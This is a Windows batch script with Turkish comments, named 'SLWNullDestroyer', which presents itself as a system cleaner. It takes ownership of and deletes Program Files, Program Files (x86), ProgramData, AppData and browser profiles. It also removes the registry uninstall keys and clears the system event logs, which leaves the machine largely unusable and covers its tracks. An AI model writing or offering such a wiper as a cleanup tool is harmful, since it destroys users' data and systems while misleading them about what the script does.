@echo off
:: Tüm sistem programları ve kalıntıları temizleniyor.
echo SLWNullDestroyer: Sistem temizleme başlıyor... 😈
echo.

:: Yönetici izni kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Bu betiği yönetici olarak çalıştırmanız gerekiyor!
    pause
    exit
)

:: 1. Program Files ve Program Files (x86) klasörlerini temizle
echo Program Files ve Program Files (x86) klasörleri temizleniyor...
takeown /f "C:\Program Files" /r /d y >nul 2>&1
icacls "C:\Program Files" /grant %username%:F /t >nul 2>&1
rd /s /q "C:\Program Files"

takeown /f "C:\Program Files (x86)" /r /d y >nul 2>&1
icacls "C:\Program Files (x86)" /grant %username%:F /t >nul 2>&1
rd /s /q "C:\Program Files (x86)"

:: 2. Kayıt Defteri'nden program girişlerini kaldır
echo Kayıt Defteri girdileri temizleniyor...
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall" /f
reg delete "HKLM\Software" /v "ProgramFilesPath" /f

:: 3. Common Files temizliği
echo Common Files klasörü temizleniyor...
takeown /f "C:\ProgramData" /r /d y >nul 2>&1
icacls "C:\ProgramData" /grant %username%:F /t >nul 2>&1
rd /s /q "C:\ProgramData"

:: 4. AppData'daki kalıntıları temizle
echo AppData klasörleri temizleniyor...
takeown /f "%localappdata%" /r /d y >nul 2>&1
icacls "%localappdata%" /grant %username%:F /t >nul 2>&1
rd /s /q "%localappdata%"

takeown /f "%appdata%" /r /d y >nul 2>&1
icacls "%appdata%" /grant %username%:F /t >nul 2>&1
rd /s /q "%appdata%"

:: 5. TEMP dosyalarını temizle
echo Geçici dosyalar temizleniyor...
del /f /s /q "%temp%\*" >nul 2>&1

:: 6. Windows Update önbelleği temizliği
echo Windows Update önbelleği temizleniyor...
net stop wuauserv >nul 2>&1
rd /s /q "C:\Windows\SoftwareDistribution" >nul 2>&1

:: 7. Tarayıcı önbelleklerini temizleme
echo Tarayıcı önbellekleri temizleniyor...
rd /s /q "%localappdata%\Google\Chrome\User Data" >nul 2>&1
rd /s /q "%localappdata%\Microsoft\Edge\User Data" >nul 2>&1
rd /s /q "%localappdata%\Mozilla\Firefox" >nul 2>&1

:: 8. Sistem günlükleri temizleme
echo Sistem günlükleri ve hata raporları temizleniyor...
wevtutil cl Application
wevtutil cl System
del /f /s /q "C:\Windows\System32\winevt\Logs\*" >nul 2>&1

:: 9. Varsayılan Windows uygulamalarını kaldır (isteğe bağlı)
echo Varsayılan Windows uygulamaları kaldırılıyor...
powershell -command "Get-AppxPackage *xbox* | Remove-AppxPackage"
powershell -command "Get-AppxPackage *cortana* | Remove-AppxPackage"

:: 10. Son mesaj
echo Tüm sistem temizliği tamamlandı. Bilgisayar neredeyse sıfırlandı!
pause
